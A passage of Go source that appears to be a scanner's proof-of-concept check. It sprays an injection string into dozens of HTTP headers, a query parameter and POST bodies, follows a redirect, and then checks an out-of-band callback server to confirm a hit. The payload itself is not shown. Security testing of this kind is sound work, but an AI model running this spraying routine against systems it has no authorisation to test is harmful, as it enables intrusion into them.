					cfg.Header.Store("X-Requested-With", cmd)
					cfg.Header.Store("X-CSRF-Token", cmd)
					cfg.Header.Store("Dnt", cmd)
					cfg.Header.Store("Content-Length", cmd)
					cfg.Header.Store("Access-Control-Request-Method", cmd)
					cfg.Header.Store("Access-Control-Request-Method", cmd)
					cfg.Header.Store("Warning", cmd)
					cfg.Header.Store("Authorization", cmd)
					cfg.Header.Store("TE", cmd)
					cfg.Header.Store("Accept-Charset", cmd)
					cfg.Header.Store("Accept-Datetime", cmd)
					cfg.Header.Store("Date", cmd)
					cfg.Header.Store("Forwarded", cmd)
					cfg.Header.Store("From", cmd)
					cfg.Header.Store("Max-Forwards", cmd)
					cfg.Header.Store("Proxy-Authorization", cmd)
					cfg.Header.Store("Range", cmd)
					cfg.Header.Store("Content-Disposition", cmd)
					cfg.Header.Store("Content-Encoding", cmd)
					cfg.Header.Store("X-Amz-Target", cmd)
					cfg.Header.Store("X-Amz-Date", cmd)
					cfg.Header.Store("Username", cmd)
					cfg.Header.Store("IP", cmd)
					cfg.Header.Store("IPaddress", cmd)
					cfg.Header.Store("Hostname", cmd)
					cfg.Header.Store("X-CSRFToken", cmd)
					cfg.Header.Store("X-XSRF-TOKEN", cmd)
					cfg.Header.Store("X-ProxyUser-Ip", cmd)
					httpclient.DoHttpRequest(u, cfg)
				}
			}
			cfg = httpclient.NewPostRequestConfig("/?getData=" + url.QueryEscape(cmd))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("X-Api-Version", cmd)
			cfg.Header.Store("User-Agent", cmd)
			cfg.Header.Store("Cookie", cmd)
			cfg.Header.Store("Refer", cmd)
			cfg.Header.Store("Accept-Language", cmd)
			cfg.Header.Store("Accept-Encoding", cmd)
			cfg.Header.Store("Upgrade-insecure-requests", cmd)
			cfg.Header.Store("Accept", cmd)
			cfg.Header.Store("upgrade-insecure-requests", cmd)
			cfg.Header.Store("X-Forwarded-For", cmd)
			cfg.Header.Store("If-Modified-Since", cmd)
			cfg.Header.Store("Origin", cmd)
			cfg.Header.Store("Pragma", cmd)
			cfg.Header.Store("X-Requested-With", cmd)
			cfg.Header.Store("X-CSRF-Token", cmd)
			cfg.Header.Store("Dnt", cmd)
			cfg.Header.Store("Content-Length", cmd)
			cfg.Header.Store("Access-Control-Request-Method", cmd)
			cfg.Header.Store("Access-Control-Request-Method", cmd)
			cfg.Header.Store("Warning", cmd)
			cfg.Header.Store("Authorization", cmd)
			cfg.Header.Store("TE", cmd)
			cfg.Header.Store("Accept-Charset", cmd)
			cfg.Header.Store("Accept-Datetime", cmd)
			cfg.Header.Store("Date", cmd)
			cfg.Header.Store("Forwarded", cmd)
			cfg.Header.Store("From", cmd)
			cfg.Header.Store("Max-Forwards", cmd)
			cfg.Header.Store("Proxy-Authorization", cmd)
			cfg.Header.Store("Range", cmd)
			cfg.Header.Store("Content-Disposition", cmd)
			cfg.Header.Store("Content-Encoding", cmd)
			cfg.Header.Store("X-Amz-Target", cmd)
			cfg.Header.Store("X-Amz-Date", cmd)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Username", cmd)
			cfg.Header.Store("IP", cmd)
			cfg.Header.Store("IPaddress", cmd)
			cfg.Header.Store("Hostname", cmd)
			cfg.Header.Store("X-CSRFToken", cmd)
			cfg.Header.Store("X-XSRF-TOKEN", cmd)
			cfg.Header.Store("X-ProxyUser-Ip", cmd)
			cfg.Data = "postData=" + url.QueryEscape(cmd)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 302 {
					lastUrl := resp.Header.Get("Location")
					cfg = httpclient.NewPostRequestConfig(lastUrl)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					cfg.Header.Store("X-Api-Version", cmd)
					cfg.Header.Store("User-Agent", cmd)
					cfg.Header.Store("Cookie", cmd)
					cfg.Header.Store("Refer", cmd)
					cfg.Header.Store("Accept-Language", cmd)
					cfg.Header.Store("Accept-Encoding", cmd)
					cfg.Header.Store("Upgrade-insecure-requests", cmd)
					cfg.Header.Store("Accept", cmd)
					cfg.Header.Store("upgrade-insecure-requests", cmd)
					cfg.Header.Store("X-Forwarded-For", cmd)
					cfg.Header.Store("If-Modified-Since", cmd)
					cfg.Header.Store("Origin", cmd)
					cfg.Header.Store("Pragma", cmd)
					cfg.Header.Store("X-Requested-With", cmd)
					cfg.Header.Store("X-CSRF-Token", cmd)
					cfg.Header.Store("Dnt", cmd)
					cfg.Header.Store("Content-Length", cmd)
					cfg.Header.Store("Access-Control-Request-Method", cmd)
					cfg.Header.Store("Access-Control-Request-Method", cmd)
					cfg.Header.Store("Warning", cmd)
					cfg.Header.Store("Authorization", cmd)
					cfg.Header.Store("TE", cmd)
					cfg.Header.Store("Accept-Charset", cmd)
					cfg.Header.Store("Accept-Datetime", cmd)
					cfg.Header.Store("Date", cmd)
					cfg.Header.Store("Forwarded", cmd)
					cfg.Header.Store("From", cmd)
					cfg.Header.Store("Max-Forwards", cmd)
					cfg.Header.Store("Proxy-Authorization", cmd)
					cfg.Header.Store("Range", cmd)
					cfg.Header.Store("Content-Disposition", cmd)
					cfg.Header.Store("Content-Encoding", cmd)
					cfg.Header.Store("X-Amz-Target", cmd)
					cfg.Header.Store("X-Amz-Date", cmd)
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg.Header.Store("Username", cmd)
					cfg.Header.Store("IP", cmd)
					cfg.Header.Store("IPaddress", cmd)
					cfg.Header.Store("Hostname", cmd)
					cfg.Header.Store("X-CSRFToken", cmd)
					cfg.Header.Store("X-XSRF-TOKEN", cmd)
					cfg.Header.Store("X-ProxyUser-Ip", cmd)
					cfg.Data = "data=" + url.QueryEscape(cmd)
					httpclient.DoHttpRequest(u, cfg)
				}
			}
			return godclient.PullExists(checkStr, time.Second*10)
		},
		nil,
	))
}
